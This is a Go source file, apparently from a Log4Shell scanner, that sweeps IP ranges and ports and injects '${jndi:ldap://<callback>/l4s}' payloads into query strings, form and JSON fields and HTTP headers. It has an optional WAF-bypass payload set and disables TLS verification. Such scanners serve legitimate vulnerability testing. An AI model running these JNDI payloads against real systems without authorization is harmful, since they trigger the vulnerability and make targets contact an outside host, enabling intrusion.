package internal

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strings"
)

const (
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	windowsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
	darwinUserAgent  = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
)

type StatusCodeHandlerFunc func(client *http.Client, resp *http.Response, req *http.Request, payload string, opts *RemoteOptions)

type RemoteScanner struct {
	client             *http.Client
	payloads           []string
	fields             []string
	statusCodeHandlers map[int]StatusCodeHandlerFunc
	opts               *RemoteOptions
}

func NewRemoteScanner(opts *RemoteOptions) (*RemoteScanner, error) {
	p, err := createPayloads(opts)
	if err != nil {
		return nil, err
	}

	f, err := readFields(opts)
	if err != nil {
		return nil, err
	}

	return &RemoteScanner{
		client:             newHTTPClient(opts),
		payloads:           p,
		fields:             f,
		statusCodeHandlers: make(map[int]StatusCodeHandlerFunc),
		opts:               opts,
	}, nil
}

func (rs *RemoteScanner) CIDRWalk(cidr string, fn func(url, payload string) error) error {
	_, ipv4Net, err := net.ParseCIDR(cidr)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)

		for _, p := range rs.opts.Ports {
			url := fmt.Sprintf("%s://%s:%s", rs.opts.Schema, ip, p)

			for _, p := range rs.payloads {
				if err := fn(url, p); err != nil {
					return err
				}
			}
		}
	}

	return nil
}

func (rs *RemoteScanner) Scan(ctx context.Context, method, target, payload string) error {
	req, err := rs.newRequest(ctx, method, target, payload)
	if err != nil {
		return err
	}

	header, err := rs.newHTTPHeader(payload)
	if err != nil {
		return err
	}

	req.Header = header

	resp, err := rs.client.Do(req)
	if err != nil {
		// ignore
		return nil
	}

	resp.Body.Close()

	if handler, ok := rs.statusCodeHandlers[resp.StatusCode]; ok {
		handler(rs.client, resp, req, payload, rs.opts)
	}

	return nil
}

func (rs *RemoteScanner) StatusCodeHandler(code int, fn StatusCodeHandlerFunc) {
	rs.statusCodeHandlers[code] = fn
}

func (rs *RemoteScanner) newRequest(ctx context.Context, method, u, payload string) (*http.Request, error) {
	var (
		req *http.Request
		err error
	)

	switch method {
	case "get":
		req, err = http.NewRequestWithContext(ctx, "GET", u, nil)
		if err != nil {
			return nil, err
		}
	case "post":
		data := url.Values{}
		for _, field := range rs.fields {
			data.Set(field, payload)
		}

		req, err = http.NewRequestWithContext(ctx, "POST", u, strings.NewReader(data.Encode()))
		if err != nil {
			return nil, err
		}
	case "json":
		values := make(map[string]string)
		for _, field := range rs.fields {
			values[field] = payload
		}

		jsonValue, err := json.Marshal(values)
		if err != nil {
			return nil, err
		}

		req, err = http.NewRequestWithContext(ctx, "POST", u, bytes.NewBuffer(jsonValue))
		if err != nil {
			return nil, err
		}
	}

	// Add payload as query string
	values := req.URL.Query()
	values.Add("q", payload)
	req.URL.RawQuery = values.Encode()

	return req, nil
}

func (rs *RemoteScanner) newHTTPHeader(payload string) (http.Header, error) {
	keys, err := readHeaders(rs.opts)
	if err != nil {
		return nil, err
	}

	var userAgent string

	switch runtime.GOOS {
	case "windows":
		userAgent = windowsUserAgent
	case "darwin":
		userAgent = darwinUserAgent
	default:
		userAgent = defaultUserAgent
	}

	header := make(http.Header)

	header.Set("User-Agent", userAgent)
	header.Set("Accept", "*/*")

	for _, h := range keys {
		if h == "User-Agent" && !rs.opts.NoUserAgentFuzzing {
			header.Set("User-Agent", payload)
			continue
		}

		if h == "Referer" {
			header.Set("Referer", fmt.Sprintf("https://%s", payload))
		}

		if h == "Cookie" {
			header.Set("Cookie", fmt.Sprintf("SessCookie=%s", payload))
		}

		header.Add(h, payload)
	}

	return header, nil
}

func newHTTPClient(opts *RemoteOptions) *http.Client {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	transport.Proxy = http.ProxyFromEnvironment
	if len(opts.Proxies) == 1 { // TODO Allow more than one proxy
		transport.Proxy = http.ProxyURL(opts.Proxies[0])
	}

	client := &http.Client{
		Timeout:   opts.Timeout,
		Transport: transport,
	}

	if opts.NoRedirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	return client
}

func createPayloads(opts *RemoteOptions) ([]string, error) {
	if opts.PayLoadsFile != "" {
		t, err := template.ParseFiles(opts.PayLoadsFile)
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, "l4s", opts.CADDR)
		if err != nil {
			return nil, err
		}

		return parseFileContent(p), nil
	}

	payloads := []string{fmt.Sprintf("${jndi:ldap://%v/l4s}", opts.CADDR)}

	if opts.WafBypass {
		t, err := template.ParseFS(f, "resource/bypass.txt")
		if err != nil {
			return nil, err
		}

		p, err := executeTemplate(t, "l4s", opts.CADDR)
		if err != nil {
			return nil, err
		}

		payloads = append(payloads, parseFileContent(p)...)
	}

	return payloads, nil
}

func readFields(opts *RemoteOptions) ([]string, error) {
	if opts.FieldsFile != "" {
		data, err := ioutil.ReadFile(opts.FieldsFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/fields.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func readHeaders(opts *RemoteOptions) ([]string, error) {
	if opts.HeadersFile != "" {
		data, err := ioutil.ReadFile(opts.HeadersFile)
		if err != nil {
			return nil, err
		}

		return parseFileContent(data), nil
	}

	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	return parseFileContent(data), nil
}

func parseFileContent(data []byte) []string {
	content := []string{}

	for _, d := range strings.Split(string(data), "\n") {
		d = strings.Trim(d, " ")
		if !strings.HasPrefix(d, "#") && d != "" { // ignore comments and empty lines
			content = append(content, d)
		}
	}

	return content
}

func executeTemplate(t *template.Template, resource string, caddr string) ([]byte, error) {
	var buf bytes.Buffer
	if err := t.Execute(&buf, map[string]string{
		"CADDR":    caddr,
		"Resource": resource,
	}); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}
